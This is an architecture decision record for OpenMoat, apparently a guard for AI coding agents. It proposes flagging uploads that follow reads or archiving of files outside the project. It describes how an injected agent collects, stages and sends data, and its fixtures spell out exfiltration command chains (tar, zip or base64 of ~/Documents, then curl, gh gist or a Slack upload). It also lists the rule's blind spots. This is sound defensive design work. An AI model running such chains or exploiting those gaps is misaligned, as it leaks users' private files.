# ADR-059: A send after the session collected or packed files from outside the project needs review

Status: proposed · Date: 2026-11-06 · Builds on ADR-020, ADR-029, ADR-047 and ADR-052

## Context

Exfiltration rarely happens in one call. An injected or misled agent first collects
(reads `~/Documents`, other projects, `~/Downloads`, notes, mail exports), then stages
(packs or encodes what it read into one file: `tar czf /tmp/a.tgz …`, `zip -r`,
`base64`), then sends (`curl -F f=@/tmp/a.tgz`, `gh gist create`, `scp`, an MCP tool
that uploads). This is MITRE ATT&CK Collection (TA0009, *Data Staged* T1074) followed
by Exfiltration (TA0010, *over a web service* T1567). Each call looks ordinary on its
own, and OpenMoat decides one call at a time.

What already holds:

- **Secret material.** `secrets-paths` denies the reads; a policy that reviews them
  taints the session, and every later `net`, `fetch` and `mcp` call needs review
  (`session-taint`, ADR-020). After a secret read, a long encoded value in a URL is
  denied (`encoded-egress`, ADR-047).
- **Known shapes on the way out.** Tokens of known formats (`token-egress`), broker
  placeholders, card numbers (`card-egress`, ADR-052) and mail lists (`@pii-egress
  emails`) are found in what a send carries.
- **Where it can go.** `default.net` denies unlisted hosts; `openmoat run` sends
  everything through the proxy, which allows only the policy's hosts.
- **Whole-home reads.** `home-sweep` holds a read of `~` or `~/.config` for review;
  `protected-contents` (ADR-038) holds a read of a folder that holds denied paths.
- **MCP.** A result of one wrapped server carried into another server's tool that acts
  needs review (`mcp-cross-server`, ADR-058).

What does not: data that is sensitive without being a secret (documents, other
repositories' source, a mail export, a customer CSV), collected file by file or folder
by folder outside the project, packed, and sent to a host the policy **allows**
(`github.com`, `api.github.com`, a package registry, a pastebin a team allowed). Every
call is `allow` or `defer`, and in an auto-approve mode a deferred call runs. The audit
log has every step, but nothing connects them.

## Decision

1. **The session's collection is folded from the audit log**, next to session taint
   (`taint.rs` in the CLI, cached with it, #570), from the calls that ran:
   - **outside reads:** each distinct path of an `fs.read` atom outside `${project}`,
     outside the agent's temp folder, outside `sandbox.read_roots` and outside the
     built-in dependency caches (`~/.cargo/registry/**`, `~/.cargo/git/**`,
     `~/go/pkg/mod/**`, `~/.m2/repository/**`, `~/.gradle/caches/**`,
     `~/.npm/_cacache/**`, `~/.cache/pip/**`, `~/.rustup/**`, the Homebrew prefix),
     and outside `staging.ignore`;
   - **outside folders:** each such `fs.read` of a folder (a recursive read is one read of
     the folder it names, POLICY.md §3.2);
   - **staged files:** each `fs.write` of a file that a packing or encoding command of
     the session wrote (`tar` and `bsdtar` in create mode, `zip`, `7z a`, `gzip`/`xz`/
     `bzip2`/`zstd` with `-c` or `-k`, `base64`, `base32`, `xxd`, `openssl enc`, `gpg -c`/
     `--symmetric`) when one of that command's inputs is an outside read or folder.
     Kept as paths, at most 64, newest kept.

   The counts are capped at the thresholds below, so the cached state stays small. The
   state never loosens anything and is read only for the decision below.

2. **A send carries the staging atom.** For each send the engine already builds for
   egress checks (ADR-047: a URL a fetch, network or MCP call opens or names, a web
   search query, a command that connects where its arguments say with everything piped
   into it), it adds `@staging-egress <host>` for each host the send goes to, other than
   this machine (`localhost`, `127.0.0.0/8`, `::1`), when either:
   - **staged:** the send names, reads or uploads one of the session's staged files
     (`curl -F f=@/tmp/a.tgz`, `-T`, `--data-binary @`, `scp`, `rsync` to a remote,
     `nc host < file`, `gh gist create file`, `gh release upload`, an MCP argument
     naming the path); or
   - **collected:** the session's outside reads reached `staging.outside_reads` (default
     **25**) or its outside folders reached `staging.outside_folders` (default **2**),
     and the send carries a file or a body (`-F`, `-T`, `-d @`, `--data-binary`, `--json`,
     `--upload-file`, a pipe into the sending command, an MCP call that acts by ADR-058
     §3). A plain `GET` with no body does not.

3. **The atom counts only where a rule names it**, as `@pii-egress` does (ADR-052 §4):
   a policy without such a rule decides exactly as before. The default policy adds a
   review group:

   ```yaml
   review:
     - id: staging-egress
       reason: sends data after this session collected or packed files from outside the project
       shell: ["@staging-egress *"]
   ```

   Review, not deny: a person exporting their own notes to a gist is real work, and the
   review names what was collected and the host.

   **Measured before it decides.** The thresholds are estimates, so the rule does not
   ship in the default policy at first. The atom is recorded with the call in the audit
   log either way, and `openmoat report` counts, per session and per active hour, the
   sends that carried it and how many outside reads and folders led there. The default
   rule (and its `policy upgrade` offer) lands only once those counts, from the
   maintainer's and volunteers' daily sessions and from MoatBench's staging scenarios,
   show it catches the scenarios and adds under one review per active hour of ordinary
   work; the thresholds are set from the same data. Until then a person can add the
   rule above to their own policy.

4. **Settings.** A new optional `staging:` section, additive to schema v1:
   `outside_reads` (integer, default 25, `0` turns this trigger off), `outside_folders`
   (default 2, `0` off), `ignore` (path globs, no `!`, added to the built-in caches).
   `policy lint` rejects negative numbers and `!` globs. Absent means the defaults.

5. **Placement.** The atom merges like any other, strictest wins: a send that is also
   denied (`default.net`, `token-egress`) stays denied; an `allow` becomes `review`.
   It is independent of `session-taint` (both may appear) and of file provenance
   (ADR-029). A grant for exactly that call (`openmoat allow --last`) answers it, as an
   allow rule does for any review (deny → allow → review, POLICY.md §4), and the next
   send after more collection needs review again.

6. **The reason names what the person needs to judge**: the host, the staged file or
   the counts and two example paths (`sends to api.github.com after reading 31 files
   outside the project, e.g. ~/Documents/q3.xlsx, ~/Downloads/export.csv`). Paths go
   through `openmoat_audit::redact` like every reason.

## Alternatives considered

- **Deny.** Too many honest workflows (publishing notes, attaching a log to an issue)
  match; ADR-025 keeps OpenMoat quiet where a person can judge.
- **Count reads inside the project.** Agents read whole repositories; any threshold
  either fires on every session or never.
- **Byte volume at the proxy.** `openmoat run`'s proxy sees request sizes, but not
  which session's reads they came from without ADR-044 credentials on every tier, and it
  cannot ask a person. Recorded as later work (below), not the first step.
- **Content matching** (hash what was read, look for it in sends, like ADR-058). Packing
  and encoding change the bytes; a hash of each read file is too large to keep per
  session. The staged-file path link is cheaper and survives packing.
- **A model judging intent.** Out of scope (THREAT_MODEL §4): decisions are deterministic.

## Consequences

- One more `review` in sessions that both work outside the project and upload. The
  defaults are set so that a normal session (reading a few configs in `~`, dependency
  sources in caches) never reaches them; `staging.ignore` covers sibling repositories a
  team works across (`~/code/**`).
- No change for policies without a `staging-egress` rule; no change to the hook's
  latency beyond the cached fold (the state is a few counters and at most 64 paths).
- **Benign cases this must not hold** (fixtures): `tar czf dist.tgz dist && npm publish`
  (inside the project); `git archive -o src.zip HEAD && gh release upload v1 src.zip`;
  a session that read 40 files under `~/.cargo/registry/src` then ran `cargo publish`;
  `curl https://docs.rs/…` after many outside reads (no body).
- **Cases it must hold** (review fixtures, threat T1): 25 file-tool reads under
  `~/Documents` then `curl -F f=@notes.md https://api.github.com/…`; `tar czf
  /tmp/d.tgz ~/Documents` then `gh gist create /tmp/d.tgz`; `zip -r /tmp/p.zip ~/code/other`
  then `curl -T /tmp/p.zip https://uploads.github.com/…`; `base64 ~/Downloads/export.csv >
  /tmp/e.txt` then an MCP `slack.post_message` naming `/tmp/e.txt`; two recursive reads
  of `~/Documents` and `~/Desktop` then `curl --data-binary @- … < x`.
- **Limits.** A send by a program the agent wrote (a script that reads and uploads) is
  decided by `session-written-code`, not here; a collection spread over several sessions
  is not linked; data typed into a send's arguments rather than read from a file is
  not a staged file; hosts the policy allows still receive what an allowed command sends
  inside HTTPS (THREAT_MODEL §5).
- **Docs:** POLICY.md (new §4.5 Staging, §6 row, `staging:` in §1), THREAT_MODEL T1 and
  T12 rows and §5, COMPLIANCE (`secret-egress` group), USAGE (reading a staging review),
  COVERAGE (generated), CHANGELOG.

## Implementation plan (each pull request ≤ 500 lines)

1. **core: the staging state and atom.** `engine/staging.rs`: the `Staging` state,
   `CompiledPolicy::collection(action, cwd, paths)` folding one call, and the atom on
   sends; `staging:` settings in `policy.rs` and `policy lint`; unit tests. No default
   rule yet, so no decision changes.
2. **cli: fold and cache.** Extend `SessionTaint` with `Staging` (cache digest bumps, so
   old cache rows are refolded); pass it to the engine in `openmoat guard`; the reason
   text; e2e test over the audit log.
3. **report: measure.** `openmoat report` counts `@staging-egress` sends per session and
   per active hour, with the outside reads and folders behind them; MoatBench gains the
   staging scenarios above. No decision changes.
4. **policy: `staging-egress`, after measuring.** The default rule, `policy upgrade`,
   conformance fixtures (the cases above, with `session:`), compliance mapping, docs,
   with thresholds taken from step 3's data.
5. **Later, separate ADR:** `openmoat run`'s proxy records request body bytes per session
   host (ADR-044 credentials) so `openmoat report` can show volume, and a byte threshold
   could become a refusal there.
